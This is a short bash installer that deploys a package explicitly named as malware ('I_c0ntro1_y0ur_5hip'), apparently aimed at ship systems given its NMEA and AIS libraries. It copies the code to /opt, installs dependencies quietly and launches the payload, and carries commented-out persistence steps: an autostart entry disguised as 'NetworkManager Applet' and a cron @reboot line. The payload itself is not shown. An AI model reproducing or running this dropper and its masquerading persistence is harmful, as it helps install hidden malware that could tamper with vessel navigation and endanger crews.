#!/bin/bash
set -e

### CONFIGURATION ###
SERVICE_NAME="I_c0ntro1_y0ur_5hip"
INSTALL_DIR="/opt/$SERVICE_NAME"
MALWARE_SRC_DIR="malware"
MALWARE_DIR="$INSTALL_DIR/$MALWARE_SRC_DIR"
VENV_DIR="$INSTALL_DIR/venv"
MAIN_PY="$MALWARE_DIR/__main__.py"

# The user under which we persist (for autostart & cron)
TARGET_USER="ubuntu"

### 1) Copy code ###
mkdir -p "$MALWARE_DIR"
cp -a "$MALWARE_SRC_DIR"/. "$MALWARE_DIR"/

### 2) Create venv ###
python3 -m venv "$VENV_DIR"

### 3) Install deps silently ###
"$VENV_DIR/bin/pip" install --quiet --no-cache-dir \
  aiohttp~=3.8 pynmea2~=1.18 pyais~=2.4 setproctitle

# ### 4) Persistence #1: .desktop autostart ###
# AUTOSTART_DIR="/home/$TARGET_USER/.config/autostart"
# mkdir -p "$AUTOSTART_DIR"
# cat > "$AUTOSTART_DIR/$SERVICE_NAME.desktop" <<EOF
# [Desktop Entry]
# Type=Application
# Exec=$VENV_DIR/bin/python $MAIN_PY
# Hidden=false
# NoDisplay=false
# X-GNOME-Autostart-enabled=true
# Name=NetworkManager Applet
# Comment=Provides network management
# EOF
# chown -R $TARGET_USER:$TARGET_USER "$AUTOSTART_DIR"

# ### 5) Persistence #2: user cron @reboot ###
# CRON_LINE="@reboot $VENV_DIR/bin/python $MAIN_PY # $SERVICE_NAME"
# # install into $TARGET_USER's crontab without duplicates
# crontab -u $TARGET_USER -l 2>/dev/null \
#   | grep -v -F "$MAIN_PY" \
#   | { cat; echo "$CRON_LINE"; } \
#   | crontab -u $TARGET_USER -

### 6) Launch NOW, replacing this script with the Python process ###
cd "$MALWARE_DIR"
exec "$VENV_DIR/bin/python" "$MAIN_PY"
